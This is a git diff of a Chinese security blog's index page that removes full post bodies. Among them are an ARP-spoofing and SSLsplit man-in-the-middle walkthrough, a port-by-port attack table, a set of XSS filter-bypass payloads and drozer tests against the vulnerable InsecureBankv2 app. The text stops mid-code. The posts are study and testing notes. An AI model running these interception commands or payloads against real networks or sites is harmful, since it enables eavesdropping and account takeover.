XposedHelpers.findClass(&quot;aqcxbom.xposedhooktarget.ArgClass&quot;, loadPackageParam.classLoader);</div><div class="line">            final Class&lt;?&gt; ArrayList= XposedHelpers.findClass(&quot;java.util.ArrayList&quot;, loadPackageParam.classLoader);</div><div class="line">            final Class&lt;?&gt; Map= XposedHelpers.findClass(&quot;java.util.Map&quot;, loadPackageParam.classLoader);</div><div class="line">                        //包名一致时查找是否有匹配参数的类及函数</div><div class="line">            XposedHelpers.findAndHookMethod(mStrClassPath, //类路径</div><div class="line">                    loadPackageParam.classLoader, //ClassLoader</div><div class="line">                    mStrMethodName, //目标函数名</div><div class="line">                    &quot;[[Ljava.lang.String;&quot;, //参数1</div><div class="line">                    Map, //参数2</div><div class="line">                    Map, //参数3</div><div class="line">                    Map, //参数4</div><div class="line">                    ArrayList, //参数5</div><div class="line">                    ArrayList, //参数6</div><div class="line">                    ArgClass, //参数7</div><div class="line">                    new XC_MethodHook() &#123;</div><div class="line">                        @Override</div><div class="line">                        protected void beforeHookedMethod(MethodHookParam param) throws Throwable &#123;</div><div class="line">                            super.beforeHookedMethod(param); //这个函数会在被hook的函数执行前执行</div><div class="line">                            LOGI(&quot;beforeHook&quot;);</div><div class="line">                        &#125;</div><div class="line">                        @Override</div><div class="line">                        protected void afterHookedMethod(MethodHookParam param) throws Throwable &#123;</div><div class="line">                            super.afterHookedMethod(param);//这个函数会在被hook的函数执行后执行</div><div class="line">                            LOGI(&quot;afterHooke param: &quot;);</div><div class="line">                        &#125;</div><div class="line">                    &#125;);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
-<h2 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h2><p><a href="https://xianzhi.aliyun.com/forum/read/611.html" target="_blank" rel="external">https://xianzhi.aliyun.com/forum/read/611.html</a></p>
-<p><a href="http://www.freebuf.com/articles/terminal/56453.html" target="_blank" rel="external">http://www.freebuf.com/articles/terminal/56453.html</a></p>
-<p><a href="http://bbs.pediy.com/showthread.php?t=202147&amp;page=2" target="_blank" rel="external">http://bbs.pediy.com/showthread.php?t=202147&amp;page=2</a></p>
-
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><h2 id="xposed框架"><a href="#xposed框架" class="headerlink" title="xposed框架"></a>xposed框架</h2><p>xposed，主页：<a href="http://repo.xposed.info/module/de.robv.android.xposed.installer">http://repo.xposed.info/module/de.robv.android.xposed.installer</a></p>
+<p>是个开源的框架，在github上有源码的，直接下载apk后安装激活就可以使用，很多地方有这方面的教程，针对不同的手机架构，有大牛做了针对性的修改。可以在论坛中进行搜索</p>
+        
+          <a class="article-more-a" href="/2017/01/05/移动安全/浅谈android hook技术/#more">more >></a>
+        
       
 
       
@@ -418,188 +348,10 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <table>
-<thead>
-<tr>
-<th>端口号</th>
-<th style="text-align:center">端口说明</th>
-<th style="text-align:right">攻击技巧</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>21/22/69</td>
-<td style="text-align:center">ftp/tftp</td>
-<td style="text-align:right">爆破、嗅探、溢出、后门</td>
-</tr>
-<tr>
-<td>22</td>
-<td style="text-align:center">ssh</td>
-<td style="text-align:right">爆破</td>
-</tr>
-<tr>
-<td>23</td>
-<td style="text-align:center">telnet</td>
-<td style="text-align:right">爆破</td>
-</tr>
-<tr>
-<td>25</td>
-<td style="text-align:center">smtp</td>
-<td style="text-align:right">邮件伪造</td>
-</tr>
-<tr>
-<td>53</td>
-<td style="text-align:center">DNS</td>
-<td style="text-align:right">DNS域传送、DNS劫持、DNS欺骗</td>
-</tr>
-<tr>
-<td>67、68</td>
-<td style="text-align:center">dhcp</td>
-<td style="text-align:right">爆破</td>
-</tr>
-<tr>
-<td>110</td>
-<td style="text-align:center">pop3</td>
-<td style="text-align:right">爆破</td>
-</tr>
-<tr>
-<td>139</td>
-<td style="text-align:center">samba</td>
-<td style="text-align:right">爆破、未授权访问、远程代码执行</td>
-</tr>
-<tr>
-<td>143</td>
-<td style="text-align:center">imap</td>
-<td style="text-align:right">爆破</td>
-</tr>
-<tr>
-<td>161</td>
-<td style="text-align:center">snmp</td>
-<td style="text-align:right">爆破</td>
-</tr>
-<tr>
-<td>389</td>
-<td style="text-align:center">ldap</td>
-<td style="text-align:right">注入攻击、未授权访问</td>
-</tr>
-<tr>
-<td>512/513/514</td>
-<td style="text-align:center">linux r</td>
-<td style="text-align:right">直接使用rlogin</td>
-</tr>
-<tr>
-<td>873</td>
-<td style="text-align:center">rsync</td>
-<td style="text-align:right">未授权访问</td>
-</tr>
-<tr>
-<td>1080</td>
-<td style="text-align:center">socket</td>
-<td style="text-align:right">爆破：进行内网渗透</td>
-</tr>
-<tr>
-<td>1352</td>
-<td style="text-align:center">lotus</td>
-<td style="text-align:right">爆破：弱口令 信息泄漏：源代码</td>
-</tr>
-<tr>
-<td>1433</td>
-<td style="text-align:center">mssql</td>
-<td style="text-align:right">爆破：使用系统用户登录 注入攻击</td>
-</tr>
-<tr>
-<td>1521</td>
-<td style="text-align:center">oracle</td>
-<td style="text-align:right">爆破：TNS 注入攻击</td>
-</tr>
-<tr>
-<td>2049</td>
-<td style="text-align:center">nfs</td>
-<td style="text-align:right">配置不当</td>
-</tr>
-<tr>
-<td>2181</td>
-<td style="text-align:center">zookeeper</td>
-<td style="text-align:right">未授权访问</td>
-</tr>
-<tr>
-<td>3306</td>
-<td style="text-align:center">mysql</td>
-<td style="text-align:right">爆破 拒绝服务 注入</td>
-</tr>
-<tr>
-<td>3389</td>
-<td style="text-align:center">rdp</td>
-<td style="text-align:right">爆破 Shift后门</td>
-</tr>
-<tr>
-<td>4848</td>
-<td style="text-align:center">glassfish</td>
-<td style="text-align:right">爆破：控制台弱口令 认证绕过</td>
-</tr>
-<tr>
-<td>5000</td>
-<td style="text-align:center">sybase/DB2</td>
-<td style="text-align:right">爆破 注入</td>
-</tr>
-<tr>
-<td>5432</td>
-<td style="text-align:center">postgresql</td>
-<td style="text-align:right">缓冲区溢出 注入攻击 爆破：弱口令</td>
-</tr>
-<tr>
-<td>5632</td>
-<td style="text-align:center">pcanywhere</td>
-<td style="text-align:right">拒绝服务 代码执行</td>
-</tr>
-<tr>
-<td>5900</td>
-<td style="text-align:center">vnc</td>
-<td style="text-align:right">爆破：弱口令 认证绕过</td>
-</tr>
-<tr>
-<td>6379</td>
-<td style="text-align:center">redis</td>
-<td style="text-align:right">未授权访问 爆破：弱口令</td>
-</tr>
-<tr>
-<td>7001</td>
-<td style="text-align:center">weblogic</td>
-<td style="text-align:right">Java反序列化 控制台弱口令 控制台部署webshell</td>
-</tr>
-<tr>
-<td>80/443/8080</td>
-<td style="text-align:center">web</td>
-<td style="text-align:right">常见web攻击 控制台爆破 对应服务器版本漏洞</td>
-</tr>
-<tr>
-<td>8069</td>
-<td style="text-align:center">zabbix</td>
-<td style="text-align:right">远程命令执行</td>
-</tr>
-<tr>
-<td>9090</td>
-<td style="text-align:center">websphere控制台</td>
-<td style="text-align:right">爆破：控制台弱口令 Java反序列</td>
-</tr>
-<tr>
-<td>9200/9300</td>
-<td style="text-align:center">elasticsearch</td>
-<td style="text-align:right">远程代码执行</td>
-</tr>
-<tr>
-<td>11211</td>
-<td style="text-align:center">memcacache</td>
-<td style="text-align:right">未授权访问</td>
-</tr>
-<tr>
-<td>27017</td>
-<td style="text-align:center">mongodb</td>
-<td style="text-align:right">爆破 未授权访问</td>
-</tr>
-</tbody>
-</table>
-
+        <p>常用的端口测试</p>
+        
+          <a class="article-more-a" href="/2017/01/03/安全测试/常见端口安全测试/#more">more >></a>
+        
       
 
       
@@ -653,28 +405,9 @@
     <div class="article-entry" itemprop="articleBody">
       
         <h4 id="查看镜像"><a href="#查看镜像" class="headerlink" title="查看镜像"></a>查看镜像</h4><p>docker images</p>
-<h4 id="查看运营的容器"><a href="#查看运营的容器" class="headerlink" title="查看运营的容器"></a>查看运营的容器</h4><p>docker ps</p>
-<h4 id="运行-ubuntu"><a href="#运行-ubuntu" class="headerlink" title="运行 ubuntu"></a>运行 ubuntu</h4><p>docker run -i -t daocloud.io/ubuntu:14.04 /bin/bash</p>
-<h4 id="运行ubuntu-退出时自动删除容器"><a href="#运行ubuntu-退出时自动删除容器" class="headerlink" title="运行ubuntu, 退出时自动删除容器"></a>运行ubuntu, 退出时自动删除容器</h4><p>docker run -i -t –rm daocloud.io/ubuntu:14.04 /bin/bash</p>
-<h4 id="切换machine，使用docker-vm"><a href="#切换machine，使用docker-vm" class="headerlink" title="切换machine，使用docker-vm"></a>切换machine，使用docker-vm</h4><p>eval “$(docker-machine env docker-vm)”</p>
-<p>####切换到 dev machine<br>eval “$(docker-machine env dev)”</p>
-<h4 id="停止所有容器"><a href="#停止所有容器" class="headerlink" title="停止所有容器"></a>停止所有容器</h4><p>docker stop $(docker ps -a -q)</p>
-<h4 id="删除指定镜像"><a href="#删除指定镜像" class="headerlink" title="删除指定镜像"></a>删除指定镜像</h4><p>docker rmi $image</p>
-<h4 id="删除无标示镜像，即id为的镜像"><a href="#删除无标示镜像，即id为的镜像" class="headerlink" title="删除无标示镜像，即id为的镜像"></a>删除无标示镜像，即id为<none>的镜像</none></h4><p>docker rmi $(docker images | grep “^<none>“ | awk “{print $3}”)</none></p>
-<h4 id="删除所有镜像"><a href="#删除所有镜像" class="headerlink" title="删除所有镜像"></a>删除所有镜像</h4><p>docker rmi $(docker images -q)</p>
-<h4 id="杀死所有正在运行的容器"><a href="#杀死所有正在运行的容器" class="headerlink" title="杀死所有正在运行的容器"></a>杀死所有正在运行的容器</h4><p>docker kill $(docker ps -a -q)</p>
-<h4 id="删除所有已经停止的容器"><a href="#删除所有已经停止的容器" class="headerlink" title="删除所有已经停止的容器"></a>删除所有已经停止的容器</h4><p>docker rm $(docker ps -a -q)</p>
-<h4 id="删除所有未打-dangling-标签的镜像"><a href="#删除所有未打-dangling-标签的镜像" class="headerlink" title="删除所有未打 dangling 标签的镜像"></a>删除所有未打 dangling 标签的镜像</h4><p>docker rmi $(docker images -q -f dangling=true)</p>
-<h4 id="删除所有镜像-1"><a href="#删除所有镜像-1" class="headerlink" title="删除所有镜像"></a>删除所有镜像</h4><p>docker rmi $(docker images -q)</p>
-<h4 id="查看内存、CPU的使用情况"><a href="#查看内存、CPU的使用情况" class="headerlink" title="查看内存、CPU的使用情况"></a>查看内存、CPU的使用情况</h4><p>docker stats $(docker ps -q)</p>
-<p>CONTAINER           CPU %               MEM USAGE / LIMIT     MEM %               NET I/O               BLOCK I/O<br>452bc3877700        0.03%               480.2 MB / 1.044 GB   45.98%              2.028 kB / 648 B      0 B / 0 B<br>c2c1dda7e9bb        0.01%               11.93 MB / 1.044 GB   1.14%               7.096 kB / 3.522 kB   0 B / 0 B<br>f35f291d6659        0.00%               9.806 MB / 1.044 GB   0.94%               8.638 kB / 8.422 kB   0 B / 0 B<br>docker-machine</p>
-<h4 id="查看机器列表"><a href="#查看机器列表" class="headerlink" title="查看机器列表"></a>查看机器列表</h4><p>docker-machine  ls<br>NAME      ACTIVE   DRIVER       STATE     URL                         SWARM   DOCKER    ERRORS<br>default   *        virtualbox   Running   tcp://192.168.99.100:2376           v1.10.3</p>
-<h4 id="查看机器状态"><a href="#查看机器状态" class="headerlink" title="查看机器状态"></a>查看机器状态</h4><p>docker-machine status default</p>
-<h4 id="登录机器default"><a href="#登录机器default" class="headerlink" title="登录机器default"></a>登录机器default</h4><p>docker-machine ssh default<br>docker-compose</p>
-<h4 id="查看运行中的容器"><a href="#查看运行中的容器" class="headerlink" title="查看运行中的容器"></a>查看运行中的容器</h4><p>docker-compose ps</p>
-<h2 id="Name-Command-State-Ports"><a href="#Name-Command-State-Ports" class="headerlink" title="Name                     Command             State               Ports"></a>Name                     Command             State               Ports</h2><p>dockerfiles_mysql_1   docker-entrypoint.sh mysqld   Up      0.0.0.0:3306-&gt;3306/tcp<br>dockerfiles_nginx_1   nginx -g daemon off;          Up      443/tcp, 0.0.0.0:8080-&gt;80/tcp<br>dockerfiles_php_1     php-fpm                       Up      0.0.0.0:9000-&gt;9000/tcp</p>
-<h4 id="运行容器"><a href="#运行容器" class="headerlink" title="运行容器"></a>运行容器</h4><p>docker-compose up</p>
-
+        
+          <a class="article-more-a" href="/2016/12/21/软件/docker常用命令/#more">more >></a>
+        
       
 
       
@@ -731,19 +464,9 @@
 <li>添加wireshark用户组</li>
 </ol>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo groupadd wireshark</div></pre></td></tr></table></figure>
-<ol>
-<li>将dumpcap更改为wireshark用户组</li>
-</ol>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo chgrp wireshark /usr/bin/dumpcap</div></pre></td></tr></table></figure>
-<ol>
-<li>让wireshark用户组有root权限使用dumpcap</li>
-</ol>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo chmod 4755 /usr/bin/dumpcap</div></pre></td></tr></table></figure>
-<ol>
-<li>将需要使用的用户名加入wireshark用户组，我的用户名是craftor</li>
-</ol>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo gpasswd -a craftor wireshark</div></pre></td></tr></table></figure>
-
+        
+          <a class="article-more-a" href="/2016/12/19/移动安全/wireshark 普通用户启动/#more">more >></a>
+        
       
 
       
@@ -778,76 +501,28 @@
 
 
   
-    <article id="post-安全测试/中间人攻击获取ssl-tsl数据" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+    <article id="post-web安全/跨域获取数据小结" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2016/12/16/安全测试/中间人攻击获取ssl-tsl数据/">中间人攻击获取ssl数据</a>
+      <a class="article-title" href="/2016/12/16/web安全/跨域获取数据小结/">跨域获取数据小结</a>
     </h1>
   
 
-        <a href="/2016/12/16/安全测试/中间人攻击获取ssl-tsl数据/" class="archive-article-date">
+        <a href="/2016/12/16/web安全/跨域获取数据小结/" class="archive-article-date">
   	<time datetime="2016-12-16T03:12:16.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2016-12-16</time>
 </a>
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h2 id="数据流量重定向"><a href="#数据流量重定向" class="headerlink" title="数据流量重定向"></a>数据流量重定向</h2><ul>
-<li>使用ARP欺骗。发送假的网关(gateway)的MAC地址（其实是攻击者的MAC地址) 给受害者, 让受害者误以为 攻击者就是网关。你不需要物理访问受害者的设备就能做到。</li>
-<li>手动改变 受害者的 默认网关。如果你能物理访问受害者设备，这是最简单的方法</li>
-<li>DNS欺骗。 对特定的域名，返回攻击者的IP作为目标服务器的地址 给受害者。</li>
-<li>修改受害者机器的/etc/hosts的条目来 转向某些域名的流量</li>
-</ul>
-<h3 id="ARP欺骗"><a href="#ARP欺骗" class="headerlink" title="ARP欺骗"></a>ARP欺骗</h3><ol>
-<li>环境：</li>
-</ol>
-<ul>
-<li>攻击者ip:192.168.31.200 操作主机</li>
-<li>网关：192.168.31.1 路由器</li>
-<li>受害者：192.168.31.224 手机或电脑</li>
-</ul>
-<ol>
-<li>开启ip转发</li>
-</ol>
-<p><code>echo 1 &gt;&gt; /proc/sys/net/ipv4/ip_forward</code></p>
-<ol>
-<li>生成CA证书  </li>
-</ol>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">openssl genrsa -out ca.key 4096</div><div class="line">openssl req -new -x509 -days 1826 -key ca.key -out ca.crt</div></pre></td></tr></table></figure>
-<ul>
-<li>第1个命令，生成 4096位的RSA私钥（以pem格式保存) ca.key</li>
-<li>第2个命令， 使用这个刚生成的私钥，来生成一个 自签名的 root CA 证书(ca.crt)</li>
-</ul>
-<p>这两个文件在后面都会用到。只有ca.crt这个证书文件，需要安装 到浏览器，或者受害者的机器上。</p>
-<ol>
-<li>端口流量转发</li>
-</ol>
-<p>用iptables进行流量转发，需要把我们需要的端口进行转发</p>
-<blockquote>
-<p>8080用作非SSL的TCP连接，比如 http, smtp, ftp<br>8443 用作SSL的连接，比如SMTP over SSL, HTTPS等</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">sysctl -w net.ipv4.ip_forward=1</div><div class="line">iptables -t nat -F</div><div class="line">iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports 8080</div><div class="line">iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-ports 8443</div><div class="line">iptables -t nat -A PREROUTING -p tcp --dport 587 -j REDIRECT --to-ports 8443</div><div class="line">iptables -t nat -A PREROUTING -p tcp --dport 465 -j REDIRECT --to-ports 8443</div><div class="line">iptables -t nat -A PREROUTING -p tcp --dport 993 -j REDIRECT --to-ports 8443</div><div class="line">iptables -t nat -A PREROUTING -p tcp --dport 995 -j REDIRECT --to-ports 8443</div></pre></td></tr></table></figure>
-<ol>
-<li>ARP欺骗</li>
-</ol>
-<p><code>ettercap -T -q -M ARP //192.168.31.224/ //192.168.31.1/</code></p>
-<p><code>arpspoof -i eth0 -t 192.168.31.1 192.168.31.224</code></p>
-<ol>
-<li>直接建立热点</li>
-</ol>
-<p>kali下可以直接建立热点，需要打开iptables的nat功能<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE #对eth0进行源nat</div><div class="line">iptables -A FORWARD -i wlan1 -o eth0 -j ACCEPT #把无线网卡流量转发到有线网卡（或者什么能上网的网卡）上面</div><div class="line">iptables -A FORWARD -p tcp --syn -s 10.0.0.0/24 -j TCPMSS --set-mss 1356 #修改最大报文段长度</div></pre></td></tr></table></figure></p>
-<ol>
-<li>使用SSLsplit进行</li>
-</ol>
-<p><code>sslsplit -D -l connect.log -j /opt/sslsplit/test1 -S logdir/ -k ca.key -c ca.crt ssl 0.0.0.0 8443 tcp 0.0.0.0 8080</code></p>
-<ol>
-<li>使用starttls-mitm进行(<a href="https://github.com/adrain09/starttls-mitm" target="_blank" rel="external">https://github.com/adrain09/starttls-mitm</a>)</li>
-</ol>
-
+        <p>本文主要介绍几种跨域获取数据的方法，比较基础，但是在跨站漏洞的挖掘和利用上会起到很大的帮助。</p>
+        
+          <a class="article-more-a" href="/2016/12/16/web安全/跨域获取数据小结/#more">more >></a>
+        
       
 
       
@@ -857,14 +532,14 @@
       
 	<div class="article-tag tagcloud">
 		<i class="icon-price-tags"></i>
-		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/安全测试/">安全测试</a></li></ul>
+		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web安全/">web安全</a></li></ul>
 	</div>
 
       
 
       
         <p class="article-more-link">
-          <a class="article-more-a" href="/2016/12/16/安全测试/中间人攻击获取ssl-tsl数据/">展开全文 >></a>
+          <a class="article-more-a" href="/2016/12/16/web安全/跨域获取数据小结/">展开全文 >></a>
         </p>
       
 
@@ -900,27 +575,10 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <ol>
-<li>css xss向量</li>
-</ol>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;style&gt;@import%20url(http://www.xsec.io/static/upload/1.css);%20z-index:9999</div></pre></td></tr></table></figure>
-<ol>
-<li>利用反引号</li>
-</ol>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">&lt;!DOCTYPE html BLAH&gt;</div><div class="line">&lt;html&gt;</div><div class="line">&lt;p onmouseover=alert`2`&gt;2121212&lt;/p&gt;</div><div class="line">&lt;p onmouseover=id=/confir/.source+&apos;m&apos;+&apos;(1)&apos;;onmousedown=eval(id)&gt; 11111&lt;/p&gt;</div><div class="line">&lt;a href=&quot;j&amp;Tab;a&amp;Tab;v&amp;Tab;a&amp;Tab;s&amp;Tab;c&amp;Tab;r&amp;Tab;i&amp;Tab;p&amp;Tab;t&amp;Tab;:a&amp;Tab;l&amp;Tab;e&amp;Tab;r&amp;Tab;t&amp;Tab;(&amp;Tab;document.domain&amp;Tab;);//http://www.baidu.com&quot;&gt;点击此处&lt;/a&gt;</div><div class="line">&lt;/html&gt;</div></pre></td></tr></table></figure>
-<ol>
-<li>利用%2f</li>
-</ol>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;body%2fonmouseover=alert(1)&gt;&lt;/body&gt;</div></pre></td></tr></table></figure>
-<ol>
-<li><p>利用html实体<br>在href中html实体是可以反解出来的</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;a href=javascrpi:&amp;#67lert(1)&gt;xss&lt;/a&gt;</div></pre></td></tr></table></figure>
-</li>
-<li><p>其他：</p>
-</li>
-</ol>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line">&quot;onmouseover=%0A&quot;confirm(1)</div><div class="line"></div><div class="line">/* HTML5 based entities were doing good in bypassing data URI RE */</div><div class="line"></div><div class="line">&lt;a href=&apos;data&amp;colon;text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+&apos;&gt;click&lt;/a&gt;</div><div class="line">&lt;a href=&apos;data:application/x-x509-user-cert;&amp;NewLine;base64&amp;NewLine;, PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&apos;&gt;click&lt;/a&gt;</div><div class="line"></div><div class="line">/* Both are Firefox specific payloads */ /* The RE initially thinks that base64 keyword is necessary. */</div><div class="line"></div><div class="line">&lt;a href=&quot;data:x,% 3 c script % 3 e alert(1) % 3 c/script %3 e&quot;&gt;click&lt;/a&gt;</div><div class="line"></div><div class="line">/* The RE thinks that only alphanumeric characters are allowed after data URI */</div><div class="line"></div><div class="line">&lt;a href=&quot;data:@[&apos;&#123;§(`__`)$&#125;&apos;]@, % 3 c script % 3 e alert(1) % 3 c/script %3 e&quot;&gt;click&lt;/a&gt;</div><div class="line"></div><div class="line">/* The first two payloads bypasses the check on word expression with the help of \ */</div><div class="line"></div><div class="line">&lt;div style=&quot;x:e\x\p\r\ession(alert(1))&quot;&gt;div&lt;/div&gt;</div><div class="line">&lt;p style=&apos;\x:\65xpre\73sio\6e(alert(1))&apos;&gt;hello barracuda&lt;/p&gt;</div><div class="line"></div><div class="line">/* The regular expression was expecting ( after the keyword expression */</div><div class="line"></div><div class="line">&lt;div style=&quot;width:expression\28 alert \28 1\29 \29&quot;&gt;I will bypass you&lt;/div&gt;</div><div class="line"></div><div class="line">/* Decimal Encoding without the presence of ; bypasses the regular expression */</div><div class="line"></div><div class="line">&lt;div style=&quot;width&amp;#58expression&amp;#40alert&amp;#40 1&amp;#41&amp;#41&quot;&gt;I will not match&lt;/div&gt;</div></pre></td></tr></table></figure>
-
+        <p>总结一些XSS的向量</p>
+        
+          <a class="article-more-a" href="/2016/12/16/web安全/xss向量/#more">more >></a>
+        
       
 
       
@@ -974,85 +632,9 @@
     <div class="article-entry" itemprop="articleBody">
       
         <p>测试app包名：com.android.insecurebankv2</p>
-<h3 id="intent-sniffer-数据嗅探"><a href="#intent-sniffer-数据嗅探" class="headerlink" title="intent sniffer(数据嗅探)"></a>intent sniffer(数据嗅探)</h3><ul>
-<li>利用app.broadcast.sniff 模块    </li>
-</ul>
-<p>首先apktool获取manifest文件，查看receiver组件，获取触发该组件的intent-filter的action name</p>
-<p>利用run app.broadcast.sniff –action theBroadcast 进行嗅探  </p>
-<p>结果获取到修改的密码信息：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">Broadcast receiver registered to sniff matching intents</div><div class="line">[*] Output is updated once a second. Press Control+C to exit.</div><div class="line">Action: theBroadcast</div><div class="line">Raw: Intent &#123; act=theBroadcast flg=0x10 (has extras) &#125;</div><div class="line">Extra: newpass=Dinesh@123! (java.lang.String)</div><div class="line">Extra: phonenumber=15555215554 (java.lang.String)</div></pre></td></tr></table></figure></p>
-<ul>
-<li>代码层次：</li>
-</ul>
-<p>获取到代码，查看注册recever的名称，这个是接受信息；可搜索sendBroadcast来查找谁发的广播</p>
-<h3 id="登入绕过"><a href="#登入绕过" class="headerlink" title="登入绕过"></a>登入绕过</h3><ul>
-<li><p>可查看manifast文件查找exported=“true”的activity名称</p>
-</li>
-<li><p>可以直接使用drozer activity模块查找暴露出的activity</p>
-</li>
-</ul>
-<p>测试：直接调用com.android.insecurebankv2.PostLogin 绕过登入，直接进入转帐等页面</p>
-<h3 id="备份安全测试"><a href="#备份安全测试" class="headerlink" title="备份安全测试"></a>备份安全测试</h3><ul>
-<li><p>可查看manifast文件查看是否允许备份allowBackup=”true”</p>
-</li>
-<li><p>可利用drozer模块：run app.package.backup -f insecurebankv2查看  </p>
-</li>
-</ul>
-<p>测试：  </p>
-<p>在当前目录下备份，在当前目录下会产生backup.ab 文件：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">adb backup -apk-shared com.android.insecurebankv2</div></pre></td></tr></table></figure>
-<ul>
-<li>读取该文件，后面可以看到登入账户的所有信息</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">cat backup.ab | (dd bs=24 count=0 skip=1; cat) | zlib-flate -uncompress &gt; backup_compressed.tar (ab的解压未成功)</div></pre></td></tr></table></figure>
-<h3 id="jdb调试app程序"><a href="#jdb调试app程序" class="headerlink" title="jdb调试app程序"></a>jdb调试app程序</h3><ul>
-<li><p>使用adb jdwp来查看那些app是可以被调试的，再次运行insecurebankv2，运行adb jdwp来查看最新增加的ID，记录（注：也可以直接使用ddms来查看可以被调试的app的pid）</p>
-</li>
-<li><p>使用adb forward tcp:1111 jdwp: pid 将调试端口转发到本地主机端口上</p>
-</li>
-<li><p>使用jdb -attach localhost:1111 链接调试端口，进行调试   </p>
-</li>
-</ul>
-<p>测试：  </p>
-<p>实验中主要是更改变量属性值，app会检查设备的root情况并且输出出来  </p>
-<p>本来为rooted，直接更改为 not rooted  </p>
-<p>可能用到的命令：  </p>
-<blockquote>
-<p>class：查看所有用到的包名<br>methods：进入到相应的函数中，这里是：methods com.android.insecurebankv2.PostLogin<br>直接在showRootStatus()方法上下断点，jdb主要命令<br>step – 执行当前行<br>step up – 执行到当前方法返回到其调用程序<br>stepi – 执行当前指令<br>next – 跳过一行（跨过调用）<br>cont – 从断点处继续执行  </p>
-</blockquote>
-<p>运行过程中，观察locals的本地变量  </p>
-<p>出现变量：isrooted=true，利用set isrooted=false进行变量设置  </p>
-<p>run运行，发现提示变为未root  </p>
-<h3 id="hack-广播接受者-恶意发送短信"><a href="#hack-广播接受者-恶意发送短信" class="headerlink" title="hack 广播接受者,恶意发送短信"></a>hack 广播接受者,恶意发送短信</h3><ul>
-<li>run app.broadcast.info 查看是否有暴露出的receiver，查看manifest文件，观察启动该接受者的action</li>
-</ul>
-<p>在反编译代码中查找该reveicer</p>
-<p>本例中代码：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">public void onReceive(Context paramContext, Intent paramIntent)</div><div class="line">&#123;</div><div class="line">Object localObject = paramIntent.getStringExtra(&quot;phonenumber&quot;);</div><div class="line">paramIntent = paramIntent.getStringExtra(&quot;newpass&quot;);</div><div class="line">并且在下面调用了 ((SmsManager)localObject).sendTextMessage(paramContext, null, paramIntent, null, null);发送短信</div></pre></td></tr></table></figure>
-<p>触发这个的reveicer的代码：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">private void broadcastChangepasswordSMS(String paramString1, String paramString2)</div><div class="line">&#123;</div><div class="line">if (TextUtils.isEmpty(paramString1.toString().trim()))</div><div class="line">&#123;</div><div class="line">System.out.println(&quot;Phone number Invalid.&quot;);</div><div class="line">return;</div><div class="line">&#125;</div><div class="line">Intent localIntent = new Intent();</div><div 